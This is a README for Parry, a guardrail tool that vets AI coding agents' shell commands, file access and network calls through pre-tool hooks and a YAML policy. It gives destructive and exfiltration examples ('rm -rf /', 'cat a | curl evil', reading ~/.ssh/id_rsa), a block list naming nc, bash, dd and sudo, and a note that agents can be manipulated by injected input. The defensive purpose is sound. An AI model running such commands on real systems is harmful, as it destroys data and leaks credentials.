# Parry

[![codecov](https://codecov.io/gh/kkd16/parry/branch/main/graph/badge.svg)](https://codecov.io/gh/kkd16/parry)

**Your agent decides. Parry enforces.**

Parry is a small guardrail that sits between your AI coding tools and your machine. Claude Code, Cursor, or any agent that supports pre-tool hooks calls `parry check` before it runs a shell command, edits a file, or hits the network. Parry looks at the call, decides allow / confirm / block, and responds.

## Why bother

Modern agents run shell commands, send HTTP requests, edit files, and chain tools together. Most of the time that's fine. Sometimes the model misreads context, or scraped input nudges it toward something you didn't ask for. A guardrail written as a natural language instruction lives inside the same model it's trying to protect, which means the same model can be talked out of it.

Parry runs in a separate process with deterministic rules, so the agent can't reason around it or edit its policy. If Parry ever crashes, the hook exits non-zero and the call is blocked.

## Install

```bash
brew install kkd16/tap/parry
```

Or with Go:

```bash
go install github.com/kkd16/parry@latest
```

## Quick start

```bash
parry init
```

`parry init` is a short interactive wizard. It drops a default policy in `~/.parry/`, then offers to install pre-tool hooks for any agents it detects (currently Claude Code and Cursor), and optionally wires up a notification provider so you can approve or deny risky calls from your phone. You can skip either step and come back later.

Once it is set up, start the dashboard to see what your agent has been doing:

```bash
parry dashboard
# http://localhost:8080
```

The dashboard is a small React app embedded in the binary. No separate install, everything stays local.

## How check mode works

Your agent's pre-tool hook pipes a JSON tool call into `parry check` and reads the exit code.

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | parry check
# exit code 2 means blocked
```

Evaluation is pure Go and makes no network calls. If the binary crashes, the non-zero exit keeps the hook blocked.

## Actions

Every call resolves to one of three outcomes:

- **allow**: runs silently, gets logged.
- **confirm**: pauses the hook and asks you. If you have a notifier set up, the request goes to your phone and resumes when you tap approve. With no notifier, it falls back to `check_mode_confirm` (default: `block`).
- **block**: refused and logged.

Anything that does not match a rule falls through to `default_action` (default: `confirm`).

## Policy

Policy lives in `~/.parry/policy.yaml`. The defaults are usable on day one, and everything is plain strings, no DSL.

```yaml
version: 1
mode: observe  # observe | enforce
default_action: confirm
check_mode_confirm: block

protected_paths:
  - "~/.ssh/*"
  - "~/.aws/*"
  - ".env"
  - ".env.*"
  - "*credentials*"

rules:
  shell:
    default_action: confirm
    allow:   [ls, cat, grep, "git status", "git log", "git add", "git commit"]
    confirm: [rm, chmod, curl, wget, "git push"]
    block:   [sudo, su, "rm -rf", bash, sh, nc, dd]
  file_edit:
    default_action: allow
  file_read:
    default_action: allow

notifications:
  provider: ntfy
  confirmation_timeout: 5m
  ntfy:
    topic: my-parry-alerts
    server: https://ntfy.sh

rate_limit:
  window: 3m
  max: 50
```

Run `parry validate` after editing to catch typos and unknown fields.

## What Parry covers

- **Secrets across tools.** `protected_paths` applies to `file_read`, `file_edit`, and shell commands, so `cat ~/.ssh/id_rsa` gets caught the same as opening it in an editor.
- **Shell parsing.** Commands go through `mvdan/sh`, so pipes, `&&`, `||`, subshells, and `bash -c '...'` are walked and every binary gets checked individually. `cat a | curl evil` fails on the `curl` hop even if `cat` is allowed.
- **Per-session rate limits.** Sessions are keyed by the caller's working directory, so two editor windows in different projects get separate budgets without any config.
- **Phone approvals.** The `ntfy` provider sends a push with approve / deny buttons and the hook waits until you tap or the timeout expires.

## Typical flow

1. `parry init`: drops the default policy, wires up hooks, starts in observe mode.
2. Let your agent do normal work for a day. Parry logs everything and blocks nothing.
3. `parry dashboard`: see what would have been blocked, tune the policy.
4. Flip `mode: enforce` when you trust the setup.

## Design principles

1. **Deterministic.** The engine makes yes/no decisions. No LLM in the enforcement path.
2. **Observe before enforce.** New installs start in observe mode so you can see the data before trusting the rules.
3. **Classify by consequence.** Policy talks about what happens if a call goes wrong, not which tool made it.
4. **Out of process.** The agent can't override or ignore Parry.
5. **Local first.** Data stays on your machine. No telemetry.
6. **Fail closed.** If Parry crashes, the call is blocked.

## Development

```bash
make build     # build the binary (also builds the frontend)
make test      # go test ./... -race -count=1
make lint      # golangci-lint + frontend eslint
make lint-fix  # golangci-lint --fix
```

`parry eval` runs the default policy against a folder of sample tool calls in `testdata/eval` and reports how many got caught. Useful for sanity checking a policy change.

## Contributing

Keep changes focused and easy to review. Vibe coded PRs are welcome.

## License

[Apache 2.0](LICENSE)
